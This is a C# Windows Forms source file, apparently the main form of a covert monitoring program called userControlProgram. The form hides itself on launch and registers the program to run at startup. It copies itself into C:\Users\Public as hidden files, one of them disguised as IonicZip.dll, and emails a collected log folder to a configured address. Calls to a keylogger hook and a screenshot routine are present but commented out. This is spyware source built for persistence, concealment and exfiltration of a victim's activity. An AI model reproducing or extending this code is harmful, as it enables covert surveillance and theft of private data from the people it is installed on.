using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Windows.Forms;

namespace userControlProgram
{
    public partial class Form1 : Form
    {
        private const string NeedPath = "C:\\Users\\Public\\userControlProgram.exe";
        private string  _mailTo;
        public string LogPath;
        private int _screenShotTimer;
        public Form1()
        {
            Hide();
            this.Visible = false;
            Enabled = false;
            SetConfigurations.SetConfig(ref _mailTo, ref LogPath, ref _screenShotTimer);
            //KeyLogger.SetHook(LogPath);
            //ScreenshotMaker.ScreenshotStart(_screenShotTimer, LogPath);
            Autorun.SetAutorunValue(true, "C:\\Users\\Public\\userControlProgram.exe");
            MailSender.MainSenderFunc(LogPath, new MailAddress(_mailTo));
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Hide();
            this.Visible = false;
            if (!File.Exists(NeedPath))
            {
                try
                {
                    File.Copy("userControlProgram.exe", "C:\\Users\\Public\\userControlProgram.exe");
                    File.SetAttributes("C:\\Users\\Public\\userControlProgram.exe", FileAttributes.Hidden);
                    File.Copy("userControlProgram.exe", "C:\\Users\\Public\\IonicZip.dll");
                    File.SetAttributes("C:\\Users\\Public\\IonicZip.dll", FileAttributes.Hidden);
                }
                catch
                {
                    
                }
            }
        }
    }
}
